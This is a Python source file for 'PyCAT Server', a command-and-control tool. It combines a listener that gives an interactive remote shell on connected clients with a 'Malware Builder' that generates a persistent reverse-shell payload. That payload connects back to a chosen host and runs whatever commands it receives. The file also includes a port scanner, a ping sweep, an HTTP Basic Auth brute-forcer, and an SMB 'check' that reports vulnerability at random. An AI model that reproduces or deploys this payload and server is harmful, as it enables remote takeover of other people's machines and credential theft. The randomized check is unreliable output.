import asyncio
import socket
import sys
import datetime
import ipaddress
import random
import platform
from rich.console import Console
from rich.prompt import Prompt, IntPrompt
from rich.table import Table
from rich.panel import Panel
import aiohttp

console = Console()

##############
# CLIENT HANDLER
##############

class ClientHandler:
    def __init__(self, reader, writer, client_id):
        self.reader = reader
        self.writer = writer
        self.client_id = client_id
        self.address = writer.get_extra_info('peername')
        self.connected_at = datetime.datetime.now()

    async def send(self, data: str):
        self.writer.write(data.encode() + b"\n")
        await self.writer.drain()

    async def recv(self):
        data = await self.reader.readline()
        return data.decode().rstrip()

    def close(self):
        self.writer.close()

##############
# SERVER CLASS
##############

class Server:
    def __init__(self, host="0.0.0.0", port=9001):
        self.host = host
        self.port = port
        self.server = None
        self.clients = {}
        self.next_id = 1

    async def start(self):
        self.server = await asyncio.start_server(self.handle_client, self.host, self.port)
        console.print(f"[green]Server started on {self.host}:{self.port}[/green]")

    async def handle_client(self, reader, writer):
        client_id = self.next_id
        self.next_id += 1
        client = ClientHandler(reader, writer, client_id)
        self.clients[client_id] = client
        console.print(f"[cyan]Client #{client_id} connected from {client.address}[/cyan]")
        try:
            while True:
                data = await reader.readline()
                if not data:
                    break
                message = data.decode().rstrip()
                # Optionally handle client-initiated messages here
        except Exception as e:
            console.print(f"[red]Error with client #{client_id}: {e}[/red]")
        finally:
            console.print(f"[yellow]Client #{client_id} disconnected[/yellow]")
            del self.clients[client_id]
            writer.close()
            await writer.wait_closed()

##############
# MALWARE BUILDER (payload client generator)
##############

def generate_client_payload(lhost: str, lport: int):
    payload = f'''\
import socket, subprocess, time, sys

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("{lhost}", {lport}))
            while True:
                data = s.recv(1024).decode()
                if data.lower() == "exit":
                    s.close()
                    sys.exit(0)
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                s.send(stdout_value)
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main()
'''
    return payload

async def malware_builder_menu():
    console.print(Panel("[bold magenta]Malware Client Builder[/bold magenta]\nThis generates a Python client payload.\n"
                        "The payload auto-connects back to your server for ethical testing.", title="Malware Builder"))
    lhost = Prompt.ask("Enter your server IP (LHOST)")
    lport = IntPrompt.ask("Enter your server port (LPORT)", default=9001)
    filename = Prompt.ask("Enter filename to save payload", default="client_payload.py")
    payload = generate_client_payload(lhost, lport)
    with open(filename, "w") as f:
        f.write(payload)
    console.print(f"[green]Payload written to {filename}[/green]")
    console.print("[yellow]Run this payload on the target machine for testing.[/yellow]")
    await asyncio.sleep(1)
    Prompt.ask("Press Enter to continue")

##############
# PENTEST TOOLS
##############

async def tcp_port_scan(host: str, start_port: int, end_port: int):
    console.print(f"[cyan]Starting TCP port scan on {host} ports {start_port}-{end_port}[/cyan]")
    open_ports = []
    sem = asyncio.Semaphore(500)

    async def scan_port(port):
        async with sem:
            try:
                conn = asyncio.open_connection(host, port)
                reader, writer = await asyncio.wait_for(conn, timeout=1.5)
                writer.close()
                await writer.wait_closed()
                open_ports.append(port)
            except:
                pass

    tasks = [scan_port(p) for p in range(start_port, end_port + 1)]
    await asyncio.gather(*tasks)

    if open_ports:
        console.print(f"[green]Open ports on {host}: {open_ports}[/green]")
    else:
        console.print(f"[yellow]No open ports found on {host} in the given range.[/yellow]")

async def grab_http_headers(url: str):
    console.print(f"[cyan]Grabbing HTTP headers from {url}[/cyan]")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=5) as resp:
                headers = resp.headers
                table = Table(title=f"HTTP Headers for {url}")
                table.add_column("Header")
                table.add_column("Value")
                for k, v in headers.items():
                    table.add_row(k, v)
                console.print(table)
    except Exception as e:
        console.print(f"[red]Failed to fetch HTTP headers: {e}[/red]")

async def dns_lookup(domain: str):
    import socket
    console.print(f"[cyan]Performing DNS lookup for {domain}[/cyan]")
    try:
        ips = socket.gethostbyname_ex(domain)[2]
        console.print(f"[green]IP addresses: {ips}[/green]")
    except Exception as e:
        console.print(f"[red]DNS lookup failed: {e}[/red]")

async def ping_sweep(subnet: str):
    console.print(f"[cyan]Starting ping sweep on subnet {subnet}[/cyan]")
    alive_hosts = []

    async def ping_host(ip):
        proc = await asyncio.create_subprocess_shell(
            f"ping -c 1 -W 1 {ip}" if sys.platform != "win32" else f"ping -n 1 -w 1000 {ip}",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.communicate()
        if proc.returncode == 0:
            alive_hosts.append(ip)

    try:
        network = ipaddress.ip_network(subnet, strict=False)
    except Exception as e:
        console.print(f"[red]Invalid subnet: {e}[/red]")
        return

    sem = asyncio.Semaphore(100)
    tasks = []
    for ip in network.hosts():
        async with sem:
            tasks.append(ping_host(str(ip)))

    await asyncio.gather(*tasks)

    if alive_hosts:
        console.print(f"[green]Alive hosts: {alive_hosts}[/green]")
    else:
        console.print("[yellow]No hosts responded.[/yellow]")

async def traceroute(host: str):
    console.print(f"[cyan]Running traceroute to {host}[/cyan]")

    if platform.system().lower() == "windows":
        cmd = f"tracert {host}"
    else:
        cmd = f"traceroute -n {host}"

    proc = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, _ = await proc.communicate()
    output = stdout.decode()
    console.print(Panel(output, title=f"Traceroute to {host}", width=80))

##############
# EXPLOIT FRAMEWORK (demo exploits)
##############

async def smb_null_session_check(target_ip: str):
    console.print(f"[cyan]Checking SMB NULL session on {target_ip} (simulated)[/cyan]")
    await asyncio.sleep(2)
    if random.choice([True, False]):
        console.print(f"[green]Vulnerable to NULL session![/green]")
    else:
        console.print(f"[yellow]No NULL session vulnerability detected.[/yellow]")

async def http_basic_auth_bruteforce(target_url: str, username: str, wordlist: list[str]):
    console.print(f"[cyan]Starting HTTP Basic Auth brute-force on {target_url}[/cyan]")
    async with aiohttp.ClientSession() as session:
        for password in wordlist:
            try:
                auth = aiohttp.BasicAuth(login=username, password=password)
                async with session.get(target_url, auth=auth) as resp:
                    if resp.status == 200:
                        console.print(f"[green]Success! Credentials: {username}:{password}[/green]")
                        return
            except Exception as e:
                console.print(f"[red]Error during brute force: {e}[/red]")
        console.print("[yellow]Brute force finished. No valid credentials found.[/yellow]")

async def exploit_menu():
    while True:
        console.clear()
        console.print(Panel("[bold magenta]Exploit Framework[/bold magenta]\n"
                            "1) SMB NULL Session Check (Demo)\n"
                            "2) HTTP Basic Auth Brute Force\n"
                            "3) Back to Main Menu", title="Exploits Menu"))
        choice = Prompt.ask("Choose exploit", choices=["1", "2", "3"])
        if choice == "1":
            target = Prompt.ask("Target IP for SMB NULL Session Check")
            await smb_null_session_check(target)
            Prompt.ask("Press Enter to continue")
        elif choice == "2":
            url = Prompt.ask("Target URL (http://example.com)")
            username = Prompt.ask("Username to brute force")
            wordlist = ["123456", "password", "admin", "letmein"]
            await http_basic_auth_bruteforce(url, username, wordlist)
            Prompt.ask("Press Enter to continue")
        else:
            break

##############
# MAIN SERVER LOOP AND UI
##############

async def shell_session(client: ClientHandler):
    console.print(f"[bold green]Shell session with client #{client.client_id}. Type 'exit' to quit.[/bold green]")
    while True:
        cmd = Prompt.ask(f"shell[{client.client_id}]>")
        if cmd.strip().lower() == "exit":
            break
        try:
            await client.send(cmd)
            resp = await client.recv()
            console.print(f"[cyan]{resp}[/cyan]")
        except Exception as e:
            console.print(f"[red]Error communicating with client: {e}[/red]")
            break
    await asyncio.sleep(1)

async def main():
    server = Server()
    await server.start()

    selected_client_id = None

    while True:
        console.clear()
        footer_text = "[bold yellow]Menu[/bold yellow]: 1) List clients  2) Select client  3) Shell  4) Malware Builder  5) Pentesting Tools  6) Exploits Framework  7) Exit"
        if selected_client_id:
            footer_text += f"  | Selected Client: [green]{selected_client_id}[/green]"
        console.print(Panel(footer_text, title="PyCAT Server"))

        choice = Prompt.ask("Select option", choices=[str(i) for i in range(1, 8)])

        if choice == "1":
            if not server.clients:
                console.print("[yellow]No clients connected.[/yellow]")
            else:
                table = Table(title="Connected Clients")
                table.add_column("ID")
                table.add_column("Address")
                table.add_column("Connected At")
                for cid, client in server.clients.items():
                    table.add_row(str(cid), str(client.address), client.connected_at.strftime("%Y-%m-%d %H:%M:%S"))
                console.print(table)
            Prompt.ask("Press Enter to continue")

        elif choice == "2":
            if not server.clients:
                console.print("[yellow]No clients connected.[/yellow]")
                await asyncio.sleep(1)
                continue
            client_id = IntPrompt.ask("Enter client ID")
            if client_id in server.clients:
                selected_client_id = client_id
                console.print(f"[green]Selected client {client_id}[/green]")
            else:
                console.print("[red]Invalid client ID[/red]")
            await asyncio.sleep(1)

        elif choice == "3":
            if not selected_client_id:
                console.print("[red]No client selected.[/red]")
                await asyncio.sleep(1)
                continue
            client = server.clients.get(selected_client_id)
            if not client:
                console.print("[red]Selected client disconnected.[/red]")
                selected_client_id = None
                await asyncio.sleep(1)
                continue
            await shell_session(client)

        elif choice == "4":
            await malware_builder_menu()

        elif choice == "5":
            while True:
                console.clear()
                console.print(Panel("[bold cyan]Pentesting Tools Menu[/bold cyan]\n"
                                    "1) TCP Port Scanner\n"
                                    "2) HTTP Header Grabber\n"
                                    "3) DNS Lookup\n"
                                    "4) Ping Sweep\n"
                                    "5) Traceroute\n"
                                    "6) Back to main menu", title="PenTest Tools"))
                p_choice = Prompt.ask("Select tool", choices=[str(i) for i in range(1, 7)])
                if p_choice == "1":
                    host = Prompt.ask("Target host/IP")
                    start_port = IntPrompt.ask("Start port", default=1)
                    end_port = IntPrompt.ask("End port", default=1024)
                    await tcp_port_scan(host, start_port, end_port)
                    Prompt.ask("Press Enter to continue")
                elif p_choice == "2":
                    url = Prompt.ask("URL (include http:// or https://)")
                    await grab_http_headers(url)
                    Prompt.ask("Press Enter to continue")
                elif p_choice == "3":
                    domain = Prompt.ask("Domain name")
                    await dns_lookup(domain)
                    Prompt.ask("Press Enter to continue")
                elif p_choice == "4":
                    subnet = Prompt.ask("Subnet (e.g. 192.168.1.0/24)")
                    await ping_sweep(subnet)
                    Prompt.ask("Press Enter to continue")
                elif p_choice == "5":
                    host = Prompt.ask("Target host/IP")
                    await traceroute(host)
                    Prompt.ask("Press Enter to continue")
                else:
                    break

        elif choice == "6":
            await exploit_menu()

        else:
            console.print("[bold red]Exiting PyCAT...[/bold red]")
            break

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[red]Interrupted by user.[/red]")
